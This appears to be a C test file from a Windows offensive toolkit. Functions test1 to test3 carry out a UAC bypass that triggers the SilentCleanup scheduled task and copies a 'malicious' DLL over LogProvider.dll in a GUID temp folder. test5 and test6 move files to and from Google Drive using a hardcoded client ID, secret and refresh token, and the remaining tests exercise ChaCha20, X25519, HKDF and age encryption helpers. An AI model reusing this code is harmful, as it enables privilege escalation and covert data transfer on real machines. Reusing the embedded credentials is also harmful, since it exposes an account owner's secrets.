#include <Windows.h>
#include <Utils.h>
#include <stdio.h>
#include <Shlwapi.h>
#include <strsafe.h>
#include <shlobj_core.h>
#include <winhttp.h>
#include <Communication.h>

VOID Callback
(
	_In_ BSTR lpInput,
	_In_ LPVOID Arg
)
{
	LPWSTR lpDllPath = (LPWSTR)Arg;
	LPSTR szFolderName, szTemp;
	CHAR szTempPath[MAX_PATH];

	szFolderName = StrStrA(lpInput, "\tFileName = \"") + lstrlenA("\tFileName = \"");
	szTemp = StrChrA(szFolderName, '"');
	szTemp[0] = '\0';
	GetTempPathA(MAX_PATH, szTempPath);
	lstrcatA(szTempPath, "\\");
	lstrcatA(szTempPath, szFolderName);
	printf("szTempPath: %s\n", szTempPath);
	//CopyFileWp(lpDllPath, szTempPath, FALSE);
}

VOID StartTaskThread()
{
	HANDLE hEvent = NULL;
	
	while (TRUE) {
		hEvent = OpenEventW(EVENT_ALL_ACCESS, FALSE, L"EventSink");
		if (hEvent != NULL) {
			break;
		}

		Sleep(2000);
	}
	
	if (!StartTask(L"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup")) {
		return;
	}
}

VOID test1() {
	HANDLE hThread = NULL;

	hThread = CreateThread(NULL, 0, StartTaskThread, NULL, 0, NULL);
	if (hThread == NULL) {
		return;
	}

	RegisterAsyncEvent(L"SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA \"Win32_Directory\" AND TargetInstance.Drive = \"C:\" AND TargetInstance.Path = \"\\\\Users\\\\Admin\\\\AppData\\\\Local\\\\Temp\\\\\" AND TargetInstance.FileName LIKE \"________-____-____-____-____________\"", Callback, L"C:\\Users\\Admin\\Desktop\\LogProvider.dll");
	return 0;
}

VOID test2
(
	_In_ LPWSTR lpDllPath
)
{
	PBYTE pOutput = NULL;
	DWORD dwSize = 0;
	WCHAR wszPath[MAX_PATH] = L"C:\\Users\\Admin\\Desktop\\Test.exe";
	LPSTR szFolderName, szTemp;
	CHAR szTempPath[MAX_PATH];

	if (!CreateProcessAndGetOutput(wszPath, &pOutput, &dwSize)) {
		wprintf(L"Error: 0x%08x\n", GetLastError());
	}

	szFolderName = StrStrA(pOutput, "\tFileName = \"") + lstrlenA("\tFileName = \"");
	szTemp = StrChrA(szFolderName, '"');
	szTemp[0] = '\0';
	GetTempPathA(MAX_PATH, szTempPath);
	lstrcatA(szTempPath, "\\");
	lstrcatA(szTempPath, szFolderName);
	CopyFileWp(lpDllPath, szTempPath, FALSE);
}

BOOL IsGUIDStringW
(
	_In_ LPWSTR lpInput
)
{
	// 01234567-0123-0123-0123-0123456789ab
	DWORD dwLength = lstrlenW(lpInput);
	UINT32 i, j;
	WCHAR AllowedCharacters[] = { L'a', L'b', L'c', L'd', L'e', L'f', L'A', L'B', L'C', L'D', L'E', L'F' };
	BOOL bIsOk = FALSE;

	if (lpInput[8] != L'-' || lpInput[13] != L'-' || lpInput[18] != L'-' || lpInput[23] != L'-') {
		return FALSE;
	}

	lpInput[8] = L'0';
	lpInput[13] = L'0';
	lpInput[18] = L'0';
	lpInput[23] = L'0';
	for (i = 0; i < dwLength; i++) {
		for (j = 0; j < _countof(AllowedCharacters); j++) {
			if (lpInput[i] == AllowedCharacters[j] || (lpInput[i] >= L'0' && lpInput[i] <= '9')) {
				bIsOk = TRUE;
				break;
			}
		}

		if (!bIsOk) {
			return FALSE;
		}
	}

	lpInput[8] = L'-';
	lpInput[13] = L'-';
	lpInput[18] = L'-';
	lpInput[23] = L'-';
	return TRUE;
}

BOOL PrintFileName(
	_In_ HANDLE hDir,
	_In_ LPWSTR lpPath,
	_In_ LPVOID lpParameters
)
{
	LPWSTR lpFileName = PathFindFileNameW(lpPath);
	LPWSTR lpDirName;
	LPWSTR lpOutput = (LPWSTR)lpParameters;

	if (StrCmpW(lpFileName, L"LogProvider.dll")) {
		return FALSE;
	}

	lpFileName[-1] = L'\0';
	lpDirName = PathFindFileNameW(lpPath);
	if (!IsGUIDStringW(lpDirName)) {
		return FALSE;
	}

	CloseHandle(hDir);
	StrCpyW(lpOutput, lpPath);
}

VOID test3
(
	_In_ LPWSTR lpMaliciousDll
)
{
	WCHAR wszLogProvider[MAX_PATH];
	DWORD dwResult;
	HANDLE hFile = INVALID_HANDLE_VALUE;

	ZeroMemory(wszLogProvider, sizeof(wszLogProvider));
	WatchFileCreationEx(L"C:\\Users\\Admin\\AppData\\Local\\Temp", TRUE, PrintFileName, wszLogProvider);
	wprintf(L"%lls\n", wszLogProvider);
	if (!IsFolderExist(wszLogProvider)) {
		wprintf(L"Folder not exist!\n");
		return;
	}

	StrCatW(wszLogProvider, L"\\LogProvider.dll");
	if (!IsFileExist(wszLogProvider)) {
		wprintf(L"File not exist!\n");
		return;
	}

	if (!CopyFileWp(lpMaliciousDll, wszLogProvider, TRUE)) {
		wprintf(L"Failed to copy dll: 0x%08x\n", GetLastError());
		return;
	}

	wprintf(L"dwResult = 0x%08x\n", dwResult);
	hFile = CreateFileW(wszLogProvider, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		wprintf(L"Failed to open dll: 0x%08x\n", GetLastError());
		return;
	}

	Sleep(1000000);
}

void test4() {
	printf("%s\n", ConvertWcharToChar(L"Hello World"));
	wprintf(L"%lls\n", ConvertCharToWchar("Hello World"));
}

void test5() {
	CHAR szUserAgent[] = "curl/7.83.1";
	CHAR szClientId[] = "178467925713-lerc06071od46cr41r3f5fjc1ml56n76.apps.googleusercontent.com";
	CHAR szClientSecret[] = "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";
	CHAR szRefreshToken[] = "1//04U3_Gum8qlGvCgYIARAAGAQSNwF-L9IrmGLxFDUJTcb8IGojFuflKaNFqpQolUQI8ANjXIbrKe0Fq_7VzJUnt0hba15FOoUCJig";
	PGOOGLE_DRIVE pGoogleDriverObj = NULL;
	pGoogleDriverObj = GoogleDriveInit(szUserAgent, szClientId, szClientSecret, szRefreshToken);
	RefreshAccessToken(pGoogleDriverObj);
	GoogleDriveUpload(pGoogleDriverObj, L"C:\\Users\\Admin\\Downloads\\json.hpp");
}

void test6() {
	CHAR szUserAgent[] = "curl/7.83.1";
	CHAR szClientId[] = "178467925713-lerc06071od46cr41r3f5fjc1ml56n76.apps.googleusercontent.com";
	CHAR szClientSecret[] = "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";
	CHAR szRefreshToken[] = "1//04U3_Gum8qlGvCgYIARAAGAQSNwF-L9IrmGLxFDUJTcb8IGojFuflKaNFqpQolUQI8ANjXIbrKe0Fq_7VzJUnt0hba15FOoUCJig";
	LPSTR lpFileId = NULL;
	PGOOGLE_DRIVE pGoogleDriverObj = NULL;
	pGoogleDriverObj = GoogleDriveInit(szUserAgent, szClientId, szClientSecret, szRefreshToken);
	RefreshAccessToken(pGoogleDriverObj);
	if (!GetFileId(pGoogleDriverObj, "11-7-2024-16-55-12.hpp", &lpFileId) || lpFileId == NULL) {
		wprintf(L"GetFileId failed at %lls\n", __FUNCTIONW__);
		return;
	}

	if (!GoogleDriveDownload(pGoogleDriverObj, lpFileId)) {
		wprintf(L"GoogleDriveDownload failed at %lls\n", __FUNCTIONW__);
		return;
	}
}

void test7() {
	CHAR szKey[] = { 86, 104, 143, 242, 31, 43, 54, 57, 2, 160, 221, 188, 232, 248, 55, 193, 132, 201, 150, 157, 25, 239, 233, 109, 59, 161, 139, 147, 18, 10, 233, 60 };
	CHAR szNonce[] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
	CHAR szCipherText[0x10] = { 0 };
	CHAR szPlainText[0x10] = { 64, 93, 146, 219, 194, 195, 208, 46, 39, 165, 15, 175, 221, 61, 97, 236 };
	LPSTR lpOutput = NULL;

	Chacha20Poly1305Encrypt(szKey, szNonce, szPlainText, sizeof(szPlainText), szCipherText);
	lpOutput = ConvertToHexString(szCipherText, sizeof(szCipherText));
	printf("%s\n", lpOutput);
	FREE(lpOutput);
	//Chacha20Poly1305Decrypt(szKey, szNonce, szCipherText, szPlainText, lstrlenA("test"));
}

void test8() {
	BYTE Buffer[] = { 152, 160, 197, 161, 181, 205, 97, 250, 161, 153 };
	LPSTR lpHexString = NULL;
	PBYTE pByteArray = NULL;
	lpHexString = ConvertToHexString(Buffer, _countof(Buffer));
	printf("lpHexString = %s\n", lpHexString);
	pByteArray = FromHexString(lpHexString);
	for (DWORD i = 0; i < _countof(Buffer); i++) {
		if (Buffer[i] != pByteArray[i]) {
			printf("Failed at %d\n", i);
			break;
		}
	}

	FREE(lpHexString);
	FREE(pByteArray);
}

void test9() {
	PBYTE pHashDigest = ComputeSHA256("Hello World", lstrlenA("Hello World"));
	LPSTR lpHexDigest = ConvertToHexString(pHashDigest, 32);
	printf("Hex digest: %s\n", lpHexDigest);
	FREE(pHashDigest);
	FREE(lpHexDigest);
	return;
}

void test10() {
	LPSTR lpOutput = NULL;
	PBYTE HMac = GenerateHmacSHA256("Secret Key", lstrlenA("Secret Key"), "Hello World", lstrlenA("Hello World"));
	lpOutput = ConvertToHexString(HMac, 32);
	printf("lpOutput: %s\n", lpOutput);
	FREE(HMac);
	return;
}

void test11() {
	CHAR szInput[] = "age1c6j0mssdmznty6ahkckmhwszhd3lquupd5rqxnzlucma482yvspsengc59";
	PBYTE pOutput;
	DWORD cbOutput = 0;
	CHAR szHrp[0x20];
	LPSTR lpOutput = NULL;

	RtlSecureZeroMemory(szHrp, sizeof(szHrp));
	Bech32Decode(szHrp, &pOutput, &cbOutput, szInput);
	lpOutput = ConvertToHexString(pOutput, cbOutput);
	printf("szOutput: %s\n", lpOutput);
	return;
}

void test12() {
	BYTE a[] = { 0x4c, 0x4a, 0x3a, 0x8a, 0xa4, 0xc, 0xa7, 0xe9, 0xc8, 0x50, 0xf9, 0x2e, 0x3c, 0x5b, 0xa3, 0x2, 0x21, 0xc0, 0x4a, 0x6a, 0xe3, 0x3e, 0xb6, 0xc0, 0x26, 0x5f, 0xb2, 0xb9, 0xc4, 0xf0, 0x92, 0xa7 };
	BYTE b[] = { 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0 };
	BYTE c[0x20] = { 0 };
	ComputeX25519(c, a, b);
	LPSTR lpOutput = ConvertToHexString(c, sizeof(c));
	printf("lpOutput: %s\n", lpOutput);
	FREE(lpOutput);
}

void test13() {
	CHAR szInfo[] = "hkdf-example";
	CHAR szKey[] = "input key";
	BYTE Salt[] = { 188, 49, 67, 71, 174, 231, 83, 62, 183, 47, 136, 245, 54, 178, 101, 135, 50, 72, 41, 97, 103, 184, 5, 86, 223, 122, 35, 123, 76, 235, 87, 30 };
	PBYTE pOutput = NULL;
	LPSTR lpOutput = NULL;

	pOutput = HKDFGenerate(Salt, sizeof(Salt), szKey, lstrlenA(szKey), NULL, 0, 41);
	lpOutput = ConvertToHexString(pOutput, 41);
	printf("lpOutput: %s\n", lpOutput);
	FREE(lpOutput);
	FREE(pOutput);
	return;
}

void test14() {
	BYTE FileKey[] = { 0xca, 0x98, 0xb5, 0xff, 0x69, 0xc9, 0x5a, 0xb7, 0x19, 0x67, 0xc6, 0xe4, 0x33, 0x5c, 0x68, 0xf5 };
	BYTE TheirPubKey[] = { 0xdd, 0x55, 0x44, 0xfc, 0xae, 0xae, 0x32, 0xea, 0xd, 0x6, 0x2e, 0x7b, 0x13, 0x46, 0xca, 0x53, 0xb5, 0xde, 0xc, 0x53, 0x2e, 0x8c, 0x6, 0xbd, 0xbc, 0x58, 0x9e, 0x6e, 0xa9, 0xa7, 0x8d, 0x61 };
	PSTANZA pResult = NULL;
	LPSTR lpOutput = NULL;

	pResult = AgeRecipientWrap(FileKey, sizeof(FileKey), TheirPubKey);
	lpOutput = ConvertToHexString(pResult->pBody, 32);
	printf("lpOutput: %s\n", lpOutput);
	FREE(lpOutput);
	FREE(pResult);
}

void test15() {
	CHAR szRecipientPubKey[] = "age1m425fl9w4cew5rgx9ea3x3k22w6aurzn96xqd0dutz0xa2d834ss2jqfkn";
	BYTE PlainText[] = { 0x8f, 0x27, 0xf7, 0xd, 0x4d, 0x41, 0x5a, 0x82, 0xb9, 0xa6, 0xdb, 0xd6, 0x2b, 0x89, 0x4b, 0xc3, 0xd2, 0x17, 0x69, 0xfa, 0xe9, 0xd3, 0xa8, 0xa1, 0xe1, 0xbc, 0xf7, 0x6f, 0xd6, 0x1d, 0xb8, 0xd6, 0xa, 0x20, 0xa7, 0xf5, 0xd6, 0x3d, 0xa1, 0x98, 0xe7, 0xe4, 0x3e, 0xcd, 0x2e, 0x8, 0xa9, 0x69, 0x40, 0x3e, 0x6, 0x8c, 0x4e, 0xfd, 0xc1, 0x83, 0xe9, 0x64, 0x6f, 0x3a, 0x21, 0x9c, 0xa5, 0x8a, 0xa9, 0xe8 };
	DWORD cbOutput = 0;
	PBYTE pCipherText = NULL;

	pCipherText = AgeEncrypt(szRecipientPubKey, PlainText, 0x42, &cbOutput);
	FREE(pCipherText);
}

int main() {
	//StartTask(L"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup");
	//test1();
	//test2(L"C:\\Users\\Admin\\Desktop\\LogProvider.dll");
	//test3(L"C:\\Users\\Admin\\Desktop\\LogProvider.dll");
	//test6();
	test7();
	//test8();
	//test9();
	//test10();
	//test11();
	//test12();
	//test13();
	//test14();
	//test15();
	return 0;
}